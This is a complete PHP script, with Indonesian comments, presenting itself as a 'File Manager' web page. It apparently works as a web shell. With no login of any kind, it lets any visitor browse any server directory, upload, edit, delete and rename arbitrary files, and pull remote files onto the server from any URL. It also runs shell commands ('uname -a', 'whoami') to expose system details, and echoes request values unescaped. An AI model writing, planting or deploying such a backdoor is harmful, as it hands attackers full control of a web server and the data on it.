<?php
// Mendapatkan direktori kerja saat ini
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$message = "";

// Fungsi untuk menampilkan daftar file
function list_files($dir) {
    $files = scandir($dir);
    return array_diff($files, array('.', '..'));
}

// Upload file
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_to_upload'])) {
    $file_name = $_FILES['file_to_upload']['name'];
    $file_tmp = $_FILES['file_to_upload']['tmp_name'];
    if (move_uploaded_file($file_tmp, $current_dir . '/' . $file_name)) {
        $message = "✅ File uploaded successfully!";
    } else {
        $message = "❌ Failed to upload file.";
    }
    header("Location: ".$_SERVER['PHP_SELF']."?dir=".urlencode($current_dir));
    exit;
}

// Edit file
if (isset($_POST['edit_file']) && isset($_POST['content'])) {
    $file_path = $_POST['edit_file'];
    $backup_dir = $current_dir . '/backup/';
    if (!is_dir($backup_dir)) mkdir($backup_dir, 0777, true);
    copy($file_path, $backup_dir . basename($file_path) . '.bak');
    file_put_contents($file_path, $_POST['content']);
    $message = "✅ File updated successfully!";
    header("Location: ".$_SERVER['PHP_SELF']."?dir=".urlencode($current_dir));
    exit;
}

// Delete file
if (isset($_GET['delete_file'])) {
    $file_to_delete = $_GET['delete_file'];
    if (file_exists($file_to_delete)) {
        unlink($file_to_delete);
        $message = "✅ File deleted successfully!";
    } else {
        $message = "❌ File not found.";
    }
    header("Location: ".$_SERVER['PHP_SELF']."?dir=".urlencode($current_dir));
    exit;
}

// Download file dari URL
function download_file_from_url($url, $destination) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($http_code == 200) {
        file_put_contents($destination, $data);
        return true;
    }
    return false;
}

if (isset($_POST['download_from_url'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'];
    $file_path = $current_dir.'/'.$filename;
    $message = download_file_from_url($url,$file_path) 
        ? "✅ File downloaded successfully from URL!" 
        : "❌ Failed to download file from URL.";
    header("Location: ".$_SERVER['PHP_SELF']."?dir=".urlencode($current_dir));
    exit;
}

// Rename file
if (isset($_POST['rename_file']) && isset($_POST['new_name'])) {
    $file_path = $_POST['rename_file'];
    $new_file_path = dirname($file_path).'/'.$_POST['new_name'];
    $message = rename($file_path,$new_file_path) 
        ? "✅ File renamed successfully!" 
        : "❌ Failed to rename file.";
    header("Location: ".$_SERVER['PHP_SELF']."?dir=".urlencode($current_dir));
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<style>
body { font-family: Arial,sans-serif; background:#f4f4f9; margin:0; padding:0; }
.container { width:90%; margin:0 auto; }
header { background:#4CAF50; color:white; padding:15px 0; text-align:center; }
.alert { padding:10px; margin-top:20px; border-radius:5px; }
.alert-success { background:#d4edda; color:#155724; border:1px solid #c3e6cb; }
.alert-error { background:#f8d7da; color:#721c24; border:1px solid #f5c6cb; }
.file-list table { width:100%; border-collapse: collapse; margin-top:20px; }
table th, table td { padding:10px; border:1px solid #ddd; text-align:left; }
table th { background:#4CAF50; color:white; }
.directory-link { color:#4CAF50; text-decoration:none; }
.directory-link:hover { text-decoration:underline; }
.upload-form, .edit-form, .url-form, .breadcrumb, .pwd, .info { margin-top:30px; background:#fff; padding:15px; border-radius:5px; box-shadow:0 0 5px rgba(0,0,0,0.1);}
.upload-form input, .url-form input { padding:5px; }
.upload-form button, .url-form button { padding:8px 15px; background:#4CAF50; color:white; border:none; cursor:pointer; }
.upload-form button:hover, .url-form button:hover { background:#45a049; }
.breadcrumb a { margin-right:5px; text-decoration:none; color:#4CAF50; }
.breadcrumb a:hover { text-decoration:underline; }
</style>
</head>
<body>
<div class="container">
<header><h1>File Manager</h1></header>

<!-- Pesan -->
<?php if($message): ?>
<div class="alert <?php echo strpos($message,'✅')!==false?'alert-success':'alert-error'; ?>">
    <?php echo $message; ?>
</div>
<?php endif; ?>

<!-- Server Info -->
<div class="info">
<h2>Server Information</h2>
<p><strong>System Info:</strong> <?php echo shell_exec('uname -a'); ?></p>
<p><strong>User:</strong> <?php echo shell_exec('whoami'); ?></p>
<p><strong>IP Address:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
</div>

<!-- Breadcrumb / Navigasi direktori -->
<div class="breadcrumb">
<?php
$dirs = explode('/', str_replace('\\','/',$current_dir));
$path = '';
echo '<a href="?dir='.urlencode('/').'">Root</a> / ';
foreach($dirs as $dir){
    if(empty($dir)) continue;
    $path .= '/'.$dir;
    echo '<a href="?dir='.urlencode($path).'">'.$dir.'</a> / ';
}
?>
</div>

<!-- Tombol Up ke parent folder -->
<div class="pwd">
<strong>Current Directory:</strong> 
<?php if($current_dir != '/'): ?>
<a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">⬆ Up</a> | 
<?php endif; ?>
<a href="?dir=<?php echo urlencode($current_dir); ?>"><?php echo $current_dir; ?></a>
</div>

<!-- Upload Form -->
<div class="upload-form">
<h2>Upload File</h2>
<form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir); ?>" method="POST" enctype="multipart/form-data">
<input type="file" name="file_to_upload" required>
<button type="submit">Upload</button>
</form>
</div>

<!-- File List -->
<div class="file-list">
<h2>Files in Directory</h2>
<table>
<thead><tr><th>Filename</th><th>Actions</th></tr></thead>
<tbody>
<?php
$files = list_files($current_dir);
foreach($files as $file):
?>
<tr>
<td>
<?php if(is_dir($current_dir.'/'.$file)): ?>
<a href="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir.'/'.$file); ?>" class="directory-link"><?php echo $file; ?></a>
<?php else: echo $file; endif; ?>
</td>
<td>
<a href="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&delete_file='.urlencode($current_dir.'/'.$file); ?>">Delete</a> |
<a href="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&edit_file='.urlencode($current_dir.'/'.$file); ?>">Edit</a> |
<a href="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir).'&rename_file='.urlencode($current_dir.'/'.$file); ?>">Rename</a>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
</div>

<!-- Rename Form -->
<div class="edit-form">
<?php if(isset($_GET['rename_file'])): ?>
<form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir); ?>" method="POST">
<input type="hidden" name="rename_file" value="<?php echo $_GET['rename_file']; ?>">
<input type="text" name="new_name" placeholder="New file name" required>
<button type="submit">Rename</button>
</form>
<?php endif; ?>
</div>

<!-- Edit Form -->
<div class="edit-form">
<?php if(isset($_GET['edit_file'])): ?>
<form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir); ?>" method="POST">
<input type="hidden" name="edit_file" value="<?php echo $_GET['edit_file']; ?>">
<textarea name="content" style="width:100%;height:300px;"><?php echo htmlspecialchars(file_get_contents($_GET['edit_file'])); ?></textarea>
<button type="submit">Save Changes</button>
</form>
<?php endif; ?>
</div>

<!-- Download from URL -->
<div class="url-form">
<h2>Download from URL</h2>
<form action="<?php echo $_SERVER['PHP_SELF'].'?dir='.urlencode($current_dir); ?>" method="POST">
<input type="text" name="url" placeholder="Enter URL" required>
<input type="text" name="filename" placeholder="Save as filename" required>
<button type="submit" name="download_from_url">Download</button>
</form>
</div>

</div>
</body>
</html>